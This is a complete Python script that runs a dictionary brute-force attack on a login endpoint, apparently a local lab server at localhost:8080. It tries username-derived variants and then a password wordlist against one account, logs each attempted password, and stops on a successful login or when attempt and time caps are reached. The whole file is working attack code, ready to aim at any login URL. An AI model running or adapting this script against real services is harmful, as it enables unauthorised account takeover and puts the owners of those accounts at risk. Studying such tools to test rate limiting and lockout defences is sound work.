import requests
import time
import json
import logging
from datetime import datetime, timedelta

# -----------------------
# CONFIG
# -----------------------
URL = "http://localhost:8080/login"
USERNAME = "tomer"
PASSWORDS_FILE = "passwords.txt"
LOG_FILE = "attempts.log"
MAX_ATTEMPTS = 1_000_000
MAX_TIME_SECONDS = 2 * 60 * 60   
REQUEST_TIMEOUT = 5             

# -----------------------
# LOGGING SETUP
# -----------------------
logging.basicConfig(
    filename="debug.log",
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

console = logging.StreamHandler()
console.setLevel(logging.INFO)
formatter = logging.Formatter("%(asctime)s | %(message)s")
console.setFormatter(formatter)
logging.getLogger().addHandler(console)

# -----------------------
# HYBRID VARIANTS
# -----------------------
def hybrid_variants(username):
    base = username.lower()
    return [
        base, base + "123", base + "1234",
        base.capitalize() + "123",
        base + "2024", base + "!1", base + "12"
    ]

# -----------------------
# BRUTE FORCE FUNCTION
# -----------------------
def brute_force_user(username):

    # Load dictionary
    try:
        with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
            dictionary = [pw.strip() for pw in f.readlines()]
    except Exception as e:
        logging.error(f"Failed to load password file: {e}")
        return

    dictionary = hybrid_variants(username) + dictionary

    attempts_count = 0
    start_time = time.time()

    logging.info(f"[*] Starting brute-force attack on user '{username}'")
    logging.info(f"[*] Total candidate passwords: {len(dictionary)}")

    # -------------------------------------------------------
    # Use ONE persistent session for all requests
    # -------------------------------------------------------
    session = requests.Session()

    for pw in dictionary:

        # Global limits
        if attempts_count >= MAX_ATTEMPTS:
            logging.warning("[!] Stopping attack: reached 1,000,000 attempts")
            break

        if time.time() - start_time >= MAX_TIME_SECONDS:
            logging.warning("[!] Stopping attack: reached 2-hour limit")
            break

        attempts_count += 1
        t0 = time.time()

        try:
            response = session.post(
                URL,
                json={"username": username, "password": pw},
                timeout=REQUEST_TIMEOUT
            )
            status = response.status_code
        except requests.exceptions.Timeout:
            logging.warning(f"[TIMEOUT] Password '{pw}'")
            status = 0
        except Exception as e:
            logging.error(f"[ERROR] Request failed: {e}")
            status = 0

        latency_ms = (time.time() - t0) * 1000

        # Log JSON line
        record = {
            "timestamp": datetime.now().isoformat(),
            "username": username,
            "password_used": pw,
            "result": "success" if status == 200 else "fail",
            "latency_ms": latency_ms
        }

        try:
            with open(LOG_FILE, "a", encoding="utf-8") as log:
                log.write(json.dumps(record) + "\n")
        except Exception as e:
            logging.error(f"Failed to write to log file: {e}")

        logging.info(
            f"{attempts_count:,} | PW='{pw}' | result={record['result']} | latency={latency_ms:.2f}ms"
        )

        if status == 200:
            logging.info(f"[+] SUCCESS! Password is: {pw}")
            break

    total_time = time.time() - start_time
    logging.info(f"[DONE] Attack finished. Attempts: {attempts_count:,}. Time: {total_time:.2f}s")


# -----------------------
# MAIN
# -----------------------
if __name__ == "__main__":
    brute_force_user(USERNAME)
